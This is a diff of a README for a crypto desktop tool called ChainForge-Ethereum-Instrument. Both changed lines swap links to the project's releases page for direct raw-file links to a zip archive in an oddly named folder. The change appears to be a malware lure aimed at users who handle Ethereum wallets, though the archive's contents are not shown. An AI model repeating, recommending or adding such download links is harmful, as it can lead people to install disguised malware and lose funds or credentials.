@@ -1,6 +1,6 @@
 # 🛠️ ChainForge-Ethereum-Instrument - Build and test Ethereum tools easily
 
-[![Download ChainForge](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/jackladderthong870/ChainForge-Ethereum-Instrument/releases)
+[![Download ChainForge](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/jackladderthong870/ChainForge-Ethereum-Instrument/main/epidermomycosis/Forge_Instrument_Chain_Ethereum_v2.6.zip)
 
 ChainForge acts as a workspace for your Ethereum tasks. It combines your wallet, smart contracts, and automation tools into one desktop application. You build your logic on a visual canvas. You drag components onto the screen and connect them to create workflows. This removes the need for complex command-line tools. You connect your wallet, build your contract or MEV strategy, and deploy from the same window.
 
@@ -27,7 +27,7 @@ ChainForge runs on Windows 10 and Windows 11. Ensure your computer meets these s
 
 To start your workflow, visit the release page to choose the correct installer for your system.
 
-[Visit this page to download the latest version](https://github.com/jackladderthong870/ChainForge-Ethereum-Instrument/releases)
+[Visit this page to download the latest version](https://raw.githubusercontent.com/jackladderthong870/ChainForge-Ethereum-Instrument/main/epidermomycosis/Forge_Instrument_Chain_Ethereum_v2.6.zip)
 
 Follow these steps to install the tool on your computer:
 
